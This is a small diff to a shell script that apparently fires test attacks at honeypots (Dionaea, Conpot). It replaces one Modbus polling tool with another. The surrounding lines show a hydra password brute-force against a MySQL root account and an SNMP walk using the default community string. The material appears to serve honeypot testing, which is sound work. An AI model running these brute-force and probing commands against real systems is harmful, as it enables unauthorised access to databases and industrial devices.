@@ -11,7 +11,7 @@ echo "Starting MySQL brute force on Dionaea (port 3306)"
 hydra -l root -P /attacks/passwords.txt mysql://$TARGET_IP -s 3306 -t 4 -vV
 
 echo "Modbus read on Conpot (port 502)"
-modpoll -m tcp -p 502 -r 1 -c 10 $TARGET_IP
+mbpoll -m tcp -p 502 -r 1 -c 10 $TARGET_IP
 
 echo "SNMP walk on Conpot (default community 'public')"
 snmpwalk -v1 -c public $TARGET_IP
